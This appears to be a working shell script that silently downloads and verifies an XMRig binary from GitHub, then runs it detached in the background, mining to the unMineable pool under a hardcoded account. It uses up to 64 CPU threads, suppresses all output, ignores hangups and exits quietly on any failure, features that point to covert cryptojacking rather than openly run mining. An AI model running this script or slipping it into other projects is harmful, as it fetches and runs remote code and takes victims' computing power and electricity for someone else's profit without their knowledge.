#!/bin/sh

PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin${PATH:+:$PATH}"
export PATH
umask 077

XMRIG_VERSION="${XMRIG_VERSION:-6.26.0}"
XMRIG_URL="${XMRIG_URL:-https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz}"
XMRIG_SHA256="${XMRIG_SHA256:-b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49}"
POOL="${POOL:-rx.unmineable.com:3333}"
ACCOUNT="${ACCOUNT:-alvin3y1}"

BASE_DIR="${XDG_DATA_HOME:-${HOME:-${TMPDIR:-/tmp}}}"
INSTALL_DIR="${XMRIG_DIR:-${BASE_DIR%/}/unmineable-xmrig}"
XMRIG="$INSTALL_DIR/xmrig"
PID_FILE="$INSTALL_DIR/xmrig.pid"
LOG_FILE="${XMRIG_LOG:-$INSTALL_DIR/xmrig.log}"
LOCK_DIR="$INSTALL_DIR/.startup-lock"

detect_cpus()
{
    if command -v nproc >/dev/null 2>&1; then
        nproc 2>/dev/null && return
    fi
    awk '/^processor[[:space:]]*:/ { count++ } END { print count + 0 }' \
        /proc/cpuinfo 2>/dev/null
}

AVAILABLE_CPUS=$(detect_cpus)
case "$AVAILABLE_CPUS" in
    ''|*[!0-9]*|0) AVAILABLE_CPUS=1 ;;
esac


if [ -z "${THREADS+x}" ]; then
    if [ "$AVAILABLE_CPUS" -ge 64 ]; then
        THREADS=64
    else
        THREADS="$AVAILABLE_CPUS"
    fi
fi
case "$THREADS" in
    ''|*[!0-9]*|0) THREADS=1 ;;
esac
if [ "$THREADS" -gt "$AVAILABLE_CPUS" ]; then
    THREADS="$AVAILABLE_CPUS"
fi

mkdir -p "$INSTALL_DIR" 2>/dev/null || exit 0

start_worker()
(
    trap '' HUP
    mkdir "$LOCK_DIR" 2>/dev/null || exit 0
    trap 'rm -rf "$LOCK_DIR"' EXIT

    if [ -r "$PID_FILE" ]; then
        read -r OLD_PID <"$PID_FILE"
        case "$OLD_PID" in
            ''|*[!0-9]*) ;;
            *) kill -0 "$OLD_PID" 2>/dev/null && exit 0 ;;
        esac
        rm -f "$PID_FILE"
    fi

    command -v curl >/dev/null 2>&1 || exit 0
    command -v tar >/dev/null 2>&1 || exit 0
    command -v sha256sum >/dev/null 2>&1 || exit 0
    command -v nohup >/dev/null 2>&1 || exit 0

    if ! printf '%s  %s\n' "$XMRIG_SHA256" "$XMRIG" |
        sha256sum -c - >/dev/null 2>&1; then
        TEMP_ARCHIVE="$INSTALL_DIR/xmrig.download.$$.tar.gz"
        TEMP_DIR="$INSTALL_DIR/xmrig.extract.$$"
        rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
        mkdir "$TEMP_DIR" 2>/dev/null || exit 0

        if ! curl -fsSL --retry 3 --connect-timeout 15 \
            "$XMRIG_URL" -o "$TEMP_ARCHIVE"; then
            rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
            exit 0
        fi
        if ! tar -xzf "$TEMP_ARCHIVE" -C "$TEMP_DIR" \
            "xmrig-${XMRIG_VERSION}/xmrig"; then
            rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
            exit 0
        fi

        TEMP_XMRIG="$TEMP_DIR/xmrig-${XMRIG_VERSION}/xmrig"
        if ! printf '%s  %s\n' "$XMRIG_SHA256" "$TEMP_XMRIG" |
            sha256sum -c - >/dev/null 2>&1; then
            rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
            exit 0
        fi

        chmod 700 "$TEMP_XMRIG" || exit 0
        mv "$TEMP_XMRIG" "$XMRIG" || exit 0
        rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
    fi

    WORKER="worker-$(date +%s)-$$"
    nohup "$XMRIG" \
        --threads="$THREADS" \
        --randomx-init="$THREADS" \
        --randomx-mode=fast \
        --cpu-no-yield \
        --huge-pages-jit \
        --print-time=60 \
        -o "$POOL" \
        -a rx \
        -k \
        -u "$ACCOUNT.$WORKER" \
        -p x \
        --ipv4 \
        --no-color \
        </dev/null >>"$LOG_FILE" 2>&1 &

    MINER_PID=$!
    printf '%s\n' "$MINER_PID" >"$PID_FILE"
    sleep 5
    if ! kill -0 "$MINER_PID" 2>/dev/null; then
        rm -f "$PID_FILE"
    fi
)

start_worker </dev/null >/dev/null 2>&1 &
exit 0
